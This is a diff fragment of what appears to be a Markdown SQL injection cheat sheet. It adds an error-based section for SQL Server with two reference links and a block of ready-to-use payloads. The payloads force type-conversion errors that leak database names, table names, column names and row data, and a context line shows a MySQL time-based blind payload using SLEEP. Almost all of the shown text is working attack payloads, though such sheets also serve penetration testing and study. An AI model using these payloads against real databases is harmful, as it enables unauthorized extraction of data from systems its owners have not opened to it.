@@ -52,6 +52,31 @@ SLEEP(IF((SELECT COUNT(*) FROM information_schema.schemata
 WHERE schema_name NOT IN ('information_schema', 'mysql', 'performance_schema'))='1', 5, 0)); 
 ```
 
+### :open_file_folder: Error-Based
+
+SQL Server 
+
+https://infosecwriteups.com/exploiting-error-based-sql-injections-bypassing-restrictions-ed099623cd94
+https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
+
+```SQL
+/* Adding additional strings ensures that error messages are prompted. */
+
+/* database */
+(CASE WHEN 1=CONVERT(INT, (CHAR(58) + CHAR(58) + (SELECT TOP 1 CAST(([name]) AS NVARCHAR(4000)) FROM [master]..[sysdatabases] WHERE name NOT IN ('master','model','msdb','tempdb')) + CHAR(58) + CHAR(58))) THEN 1 ELSE 2 END)
+
+/* table */
+(CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 table_name FROM information_schema.tables)) THEN 1 ELSE 2 END)
+(CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN ('test'))) THEN 1 ELSE 2 END)
+
+/* column */
+(CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 column_name FROM information_schema.columns where table_name = 'test')) THEN 1 ELSE 2 END)
+(CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 column_name FROM information_schema.columns where table_name = 'test' AND column_name NOT IN ('id'))) THEN 1 ELSE 2 END)
+
+/* data */
+(CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 column1+';'+column2 FROM [database].dbo.test where id=3)) THEN 1 ELSE 2 END)
+```
+
 ### :open_file_folder: MySQL
 
 Get DBs
